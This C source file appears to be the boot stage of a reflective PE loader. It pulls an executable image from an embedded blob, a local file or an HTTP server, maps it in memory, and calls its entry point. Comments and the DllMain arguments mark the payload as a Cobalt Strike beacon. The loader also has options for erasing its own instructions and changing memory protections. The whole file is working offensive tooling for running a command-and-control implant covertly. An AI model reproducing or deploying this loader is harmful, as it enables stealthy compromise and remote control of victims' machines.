#include "c_types.h"
#include "win_types.h"
#include "lib_memory.h"
#include "rel_addr.h"
#include "pe_image.h"
#include "errno.h"
#include "runtime.h"
#include "pe_loader.h"
#include "boot.h"

static errno loadOption(Runtime_Opts* options);
static void* loadImage(Runtime_M* runtime, byte* config, uint32 size);

static void* loadImageFromEmbed(Runtime_M* runtime, byte* config);
static void* loadImageFromFile(Runtime_M* runtime, byte* config);
static void* loadImageFromHTTP(Runtime_M* runtime, byte* config);

errno Boot()
{
    // initialize Gleam-RT for PE Loader
    Runtime_Opts options = {
        .BootInstAddress     = GetFuncAddr(&Boot),
        .NotEraseInstruction = false,
        .NotAdjustProtect    = false,
        .TrackCurrentThread  = false,
    };
    errno elo = loadOption(&options);
    if (elo != NO_ERROR)
    {
        return elo;
    }
    Runtime_M* runtime = InitRuntime(&options);
    if (runtime == NULL)
    {
        return GetLastErrno();
    }

    // initialize PE Loader
    PELoader_M* loader = NULL;
    errno err = NO_ERROR;
    for (;;)
    {
        // load PE Image, it cannot be empty
        void* image; uint32 size;
        if (!runtime->Argument.GetPointer(ARG_ID_PE_IMAGE, &image, &size))
        {
            err = ERR_NOT_FOUND_PE_IMAGE;
            break;
        }
        if (size == 0)
        {
            err = ERR_EMPTY_PE_IMAGE_DATA;
            break;
        }
        image = loadImage(runtime, image, size);
        if (image == NULL)
        {
            err = GetLastErrno();
            break;
        }
        PELoader_Cfg config = {
            .FindAPI = runtime->HashAPI.FindAPI,

            .Image        = image,
            .CommandLineA = NULL,
            .CommandLineW = NULL,
            .WaitMain     = false,
            .AllowSkipDLL = false,
            .StdInput     = NULL,
            .StdOutput    = NULL,
            .StdError     = NULL,

            .NotEraseInstruction = options.NotEraseInstruction,
            .NotAdjustProtect    = options.NotAdjustProtect,
        };
        loader = InitPELoader(runtime, &config);
        if (loader == NULL)
        {
            err = GetLastErrno();
            break;
        }
        runtime->Memory.Free(image);
        runtime->Argument.EraseAll();
        // initialize dll before start beacon
        err = loader->Execute();
        break;
    }
    if (err != NO_ERROR || loader == NULL)
    {
        runtime->Core.Exit();
        return err;
    }

    // call cs beacon entry point
    DllMain_t dllMain = (DllMain_t)(loader->EntryPoint);
    HMODULE   hModule = (HMODULE)(loader->ImageBase);
    if (!dllMain(hModule, 4, (LPVOID)(0x56A2B5F0)))
    {
        err = ERR_CALL_BEACON_ENTRY_POINT;
    }

    // destroy pe loader and exit runtime
    errno eld = loader->Destroy();
    if (eld != NO_ERROR && err == NO_ERROR)
    {
        err = eld;
    }
    errno ere = runtime->Core.Exit();
    if (ere != NO_ERROR && err == NO_ERROR)
    {
        err = ere;
    }
    return err;
}

__declspec(noinline)
static errno loadOption(Runtime_Opts* options)
{
    uintptr stub = (uintptr)(GetFuncAddr(&Argument_Stub));
    stub -= OPTION_STUB_SIZE;
    // check runtime option stub is valid
    if (*(byte*)stub != OPTION_STUB_MAGIC)
    {
        return ERR_INVALID_OPTION_STUB;
    }
    // load runtime options from stub
    options->NotEraseInstruction = *(bool*)(stub+OPT_OFFSET_NOT_ERASE_INSTRUCTION);
    options->NotAdjustProtect    = *(bool*)(stub+OPT_OFFSET_NOT_ADJUST_PROTECT);
    options->TrackCurrentThread  = *(bool*)(stub+OPT_OFFSET_NOT_TRACK_CURRENT_THREAD);
    return NO_ERROR;
}

static void* loadImage(Runtime_M* runtime, byte* config, uint32 size)
{
    if (size < 1)
    {
        SetLastErrno(ERR_INVALID_IMAGE_CONFIG);
        return NULL;
    }
    byte mode = *config;
    config++;
    switch (mode)
    {
    case MODE_EMBED_IMAGE:
        return loadImageFromEmbed(runtime, config);
    case MODE_LOCAL_FILE:
        return loadImageFromFile(runtime, config);
    case MODE_HTTP_SERVER:
        return loadImageFromHTTP(runtime, config);
    default:
        SetLastErrno(ERR_INVALID_LOAD_MODE);
        return NULL;
    }
}

static void* loadImageFromEmbed(Runtime_M* runtime, byte* config)
{
    byte mode = *config;
    config++;
    switch (mode)
    {
    case EMBED_DISABLE_COMPRESS:
      {
        uint32 size = *(uint32*)config;
        void* buf = runtime->Memory.Alloc(size);
        mem_copy(buf, config + 4, size);
        return buf;
      }
    case EMBED_ENABLE_COMPRESS:
      {
        uint32 rawSize = *(uint32*)(config+0);
        uint32 comSize = *(uint32*)(config+4);
        byte*  comData = (byte*)(config+8);
        void* buf = runtime->Memory.Alloc(rawSize);
        uint size = runtime->Compressor.Decompress(buf, comData, comSize);
        if (size != (uint)rawSize)
        {
            SetLastErrno(ERR_INVALID_COMPRESS_DATA);
            return NULL;
        }
        return buf;
      }
    default:
        SetLastErrno(ERR_INVALID_EMBED_CONFIG);
        return NULL;
    }
}

static void* loadImageFromFile(Runtime_M* runtime, byte* config)
{
    databuf file;
    errno errno = runtime->WinFile.ReadFileW((LPWSTR)config, &file);
    if (errno != NO_ERROR)
    {
        SetLastErrno(errno);
        return NULL;
    }
    if (file.len < 64)
    {
        SetLastErrno(ERR_INVALID_PE_IMAGE);
        return NULL;
    }
    return file.buf;
}

static void* loadImageFromHTTP(Runtime_M* runtime, byte* config)
{
    HTTP_Request req;
    if (!runtime->Serialization.Unserialize(config, &req))
    {
        SetLastErrno(ERR_INVALID_HTTP_CONFIG);
        return NULL;
    }
    HTTP_Response resp;
    errno errno = runtime->WinHTTP.Get(&req, &resp);
    if (errno != NO_ERROR)
    {
        SetLastErrno(errno);
        return NULL;
    }
    if (resp.StatusCode != 200)
    {
        SetLastErrno(ERR_INVALID_HTTP_STATUS_CODE);
        return NULL;   
    }
    if (resp.Body.len < 64)
    {
        SetLastErrno(ERR_INVALID_PE_IMAGE);
        return NULL;
    }
    runtime->WinHTTP.Free();
    return resp.Body.buf;
}
